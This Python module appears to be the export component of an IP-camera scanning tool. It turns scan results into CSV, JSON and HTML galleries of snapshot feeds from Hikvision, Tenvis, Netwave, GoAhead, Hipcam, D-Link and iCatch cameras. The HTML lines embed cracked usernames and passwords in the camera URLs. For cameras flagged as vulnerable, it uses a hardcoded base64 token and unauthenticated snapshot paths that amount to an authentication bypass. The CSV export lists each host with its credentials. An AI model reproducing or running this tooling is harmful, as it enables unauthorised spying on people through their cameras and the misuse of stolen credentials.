import base64
from json import dumps
from time import sleep
from datetime import date, datetime

from PyQt5.QtCore import QThread


def get_timestamp():
    now = datetime.now()
    timestamp = now.strftime("%d_%m_%Y-%H_%M")
    return str(timestamp)


def cleaning_headers(headers):
    try:
        del headers['Date']
        del headers['Cache-Control']
        del headers['Content-Type']
        del headers['Connection']
    except KeyError:
        pass
    return headers


class Exporter(QThread):

    def __init__(self, format, data, parent=None, ):
        super(Exporter, self).__init__(parent)
        self.format = format
        self.client = None
        self.data = data
        self.num_of_ch = 1
        self.output = []
        self.path = None

    def run(self, ):
        if self.format == 'html':
            self.make_output_html()
            self.write_results()
        elif self.format == 'csv':
            self.make_csv()
        elif self.format == 'json':
            self.make_json()

    def make_output_html(self):
        # print(self.data)
        # sleep(100)
        for host in self.data:
            # print(host)
            # print(host)
            try:
                if host['vendor'] == 'Hikvision':
                    if host['vuln']:
                        self.output.append(build_html_line_hik(host['host'], service='App-webs/'))
                    elif 'usr' in host:
                        for _ in range(1, int(host['ch'])):
                            self.output.append(build_html_line_hik(
                                host['host'], creds=f'{host["usr"]}:{host["pwd"]}', numb_of_ch=_,
                                service=host['authservice']))
                elif host['vendor'] == 'Tenvis':
                    if host['vuln']:
                        self.output.append(build_html_line_tenvis(host['host']))

                elif host['usr']:
                    if host['vendor'] == 'Netwave':
                        self.output.append(build_html_line_Netwave(host['host'], creds=f'{host["usr"]}:{host["pwd"]}'))
                    elif host['vendor'] == 'GoAhead':
                        self.output.append(build_html_line_GoAhead(host['host'], usr=host["usr"], pwd=host["pwd"]))
                    elif host['vendor'] == 'Hipcam':
                        self.output.append(build_html_line_Hipcam(host['host'], creds=f'{host["usr"]}:{host["pwd"]}'))
                    elif host['vendor'] == 'D-Link':
                        self.output.append(build_html_line_Dlink(host['host'], creds=f'{host["usr"]}:{host["pwd"]}'))
                    elif host['vendor'] == 'iCatch':
                        # print("RUN")
                        for ch in range(int(host['ch'])):
                            self.output.append(build_html_line_iCatch(
                                host['host'], str(ch), creds=f'{host["usr"]}:{host["pwd"]}'))
                        # self.output.append(build_html_line_iCatch(host['host'], creds=f'{host["usr"]}:{host["pwd"]}'))
            except KeyError as e:
                print(e)
                pass
            except ValueError as e:
                print(e)
                pass
            except Exception as e:
                print(e)
                pass

    def write_results(self):
        number = 1
        timestamp = get_timestamp()
        while len(self.output) > 0:
            path = f'results/Export/results_{number}_{timestamp}.{self.format}'
            with open(path, 'w') as f:
                for _ in range(1000):
                    f.write(self.output.pop())
                    if len(self.output) == 0:
                        break
                number += 1
        self.path = f'results/Export/results_*_{timestamp}.{self.format}'

    ###########################################################################################################################################

    def make_csv(self):
        timestamp = get_timestamp()
        with open(f'results/Export/results_{timestamp}.csv', 'w') as f:
            f.write('HOST,DEVICE,VENDOR,USERNAME,PASSWORD,HEADERS\n')
            for host in self.data:
                for i in host:
                    if host[i] is None:
                        host[i] = ''
                try:
                    formatted_headers = cleaning_headers(host["resp"].headers)
                    formatted_headers = str(formatted_headers).replace(',', ';')
                except:
                    formatted_headers = ''
                f.write(
                    f'{host["host"]},{host["device"]},{host["vendor"]},{host["usr"]},{host["pwd"]},{formatted_headers}\n')

        self.path = f'results/Export/results_{timestamp}.csv'

    def make_json(self):
        total = dict()
        with open(f'results/Export/results_{get_timestamp()}.{self.format}', 'w') as f:
            for host in self.data:
                if type(host['resp']) is not str:
                    host['resp'] = host['resp'].text
                total.update(host)
            f.write(dumps(total))
        self.path = f'results/Export/results_*.{self.format}'


###########################################################################################################################################


def build_html_line_hik(host, creds='', service='', numb_of_ch=''):
    if creds:
        auth = base64.encodebytes(creds.encode()).replace(b'=\n', b'').decode()
    else:
        auth = 'YWRtaW46MTEK'
    if service == 'App-webs/':
        url = f'http://{host}/onvif-http/snapshot?auth={auth}'
    else:
        url = f'http://{creds}@{host}/ISAPI/Streaming/channels/{numb_of_ch}01/picture'
    return f'''<img \
height = "176" \
width = "320" \
src = "{url}" \
onerror = "this.style.display='none'" \
onclick = "window.open('{url}', '_blank');" />\n'''
    return


def build_html_line_tenvis(host, creds='', service=''):
    url = f'http://{host}/videostream.cgi?user=&amp;pwd='

    return f'''<img \
    height = "176" \
    width = "320" \
    src = "{url}" \
    onerror = "this.style.display='none'" \
    onclick = "window.open('{url}', '_blank');" />\n'''

    # JPEG url for DNVRS-???


def build_html_line_Netwave(host, creds=''):
    return f'''<img \
height = "176" \
width = "320" \
src = "http://{creds}@{host}/snapshot.cgi" \
onerror = "this.style.display='none'" \
onclick = "window.open('http://{creds}@{host}/videostream.cgi', '_blank');" />\n'''


def build_html_line_GoAhead(host, usr='', pwd=''):
    return f'''<img \
height = "176" \
width = "320" \
src = "http://{host}/snapshot.cgi?loginuse={usr}&loginpas={pwd}" \
onerror = "this.style.display='none'" \
onclick = "window.open('http://{host}/videostream.cgi?loginuse={usr}&loginpas={pwd}', '_blank');" />\n'''


def build_html_line_Hipcam(host, creds=''):
    if len(creds) == 0:
        return ''
    else:
        username, password = creds.split(':')
        return f'''<img \
height = "176" \
width = "320" \
src = "http://{host}/tmpfs/auto.jpg?usr={username}&pwd={password} " \
onerror = "this.style.display='none'" \
onclick = "window.open('http://{host}/tmpfs/snap.jpg?usr={username}&pwd={password}', '_blank');" />\n'''


def build_html_line_Dlink(host, creds=''):
    return f'''<img \
    height = "176" \
    width = "320" \
    src = "http://{creds}@{host}/image.jpg" \
    onerror = "this.style.display='none'" \
    onclick = "window.open('http://{creds}@{host}/video/mjpg.cgi', '_blank');" />\n'''


def build_html_line_iCatch(host, ch, creds=''):
    return f'''<img \
        height = "176" \
        width = "320" \
        src = "http://{creds}@{host}/cgi-bin/net_jpeg.cgi?ch={ch}" \
        onerror = "this.style.display='none'" \
        onclick = "window.open('http://{creds}@{host}/cgi-bin/net_jpeg.cgi?ch={ch}', '_blank');" />\n'''
